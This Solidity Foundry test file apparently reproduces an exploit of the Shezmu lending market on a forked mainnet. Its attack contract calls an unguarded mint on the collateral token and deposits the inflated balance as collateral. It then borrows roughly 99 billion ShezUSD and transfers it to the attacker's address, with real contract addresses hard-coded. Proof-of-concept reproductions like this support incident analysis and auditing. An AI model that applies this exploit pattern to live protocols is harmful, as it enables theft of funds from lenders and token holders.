
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 20794864;
    uint256 constant TX_TIMESTAMP = 1726872275;
    uint256 constant TX_BLOCK_NUMBER = 20794865;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        ShezmuBorrowAttack attack = _bindAttackRuntime();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _bindAttackRuntime() internal returns (ShezmuBorrowAttack attack) {
        vm.etch(ATTACK_CONTRACT, type(ShezmuBorrowAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
        attack = ShezmuBorrowAttack(payable(ATTACK_CONTRACT));
    }

    function _prepareProfit(ShezmuBorrowAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.ATTACKER_EOA, address(0), Addresses.SHEZ_USD, "ShezUSD", 98999168398020000000000000000
        );
    }
}

contract ShezmuBorrowAttack {
    IERC20Like private constant COLLATERAL_TOKEN = IERC20Like(Addresses.WBTC);
    IERC20Like private constant PROFIT_TOKEN = IERC20Like(Addresses.SHEZ_USD);
    IShezmuLending private constant LENDING_MARKET = IShezmuLending(Addresses.SHEZMU_LENDING_MARKET);
    uint256 private constant COLLATERAL_AMOUNT = 340282366920938463463374607431768211455;
    uint256 private constant BORROW_AMOUNT = 99999159998000000000000000000;

    constructor() payable {}

    function attack() external payable {
        executeBorrowSetup();
    }

    function executeSetup() external payable {
        executeBorrowSetup();
    }

    function executeBorrowSetup() public {
        approvePull();
        mintCollShare();
        depositCollateral();
        borrowShezUsd();
        collectProfit();
    }

    function approvePull() internal {
        COLLATERAL_TOKEN.approve(Addresses.SHEZMU_LENDING_MARKET, type(uint256).max);
    }

    function mintCollShare() internal {

        (bool ok,) = address(COLLATERAL_TOKEN)
            .call(abi.encodeWithSelector(bytes4(0x40c10f19), address(this), Addresses.MAX_ADDR_WORD));
        require(ok, "collateral share mint failed");
    }

    function depositCollateral() internal {
        LENDING_MARKET.addCollateral(COLLATERAL_AMOUNT);
    }

    function borrowShezUsd() internal {
        LENDING_MARKET.borrow(BORROW_AMOUNT);
    }

    function collectProfit() internal {
        uint256 profitBalance = PROFIT_TOKEN.balanceOf(address(this));
        PROFIT_TOKEN.transfer(Addresses.ATTACKER_EOA, profitBalance);
    }

    receive() external payable {}

    fallback() external payable {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant MAX_ADDR_WORD = 0x00000000fFFFffffffFfFfFFffFfFffFFFfFffff;
    address internal constant WBTC = 0x641249dB01d5C9a04d1A223765fFd15f95167924;
    address internal constant SHEZMU_LENDING_MARKET = 0x75a04A1FeE9e6f26385ab1287B20ebdCbdabe478;
    address internal constant ATTACKER_EOA = 0xA3a64255484aD65158AF0F9d96B5577F79901a1D;
    address internal constant SHEZ_USD = 0xD60EeA80C83779a8A5BFCDAc1F3323548e6BB62d;
    address internal constant ATTACK_CONTRACT = 0xEd4B3d468DEd53a322A8B8280B6f35aAE8bC499C;
}

interface IShezmuLending {
    function addCollateral(uint256) external;
    function borrow(uint256) external;
}
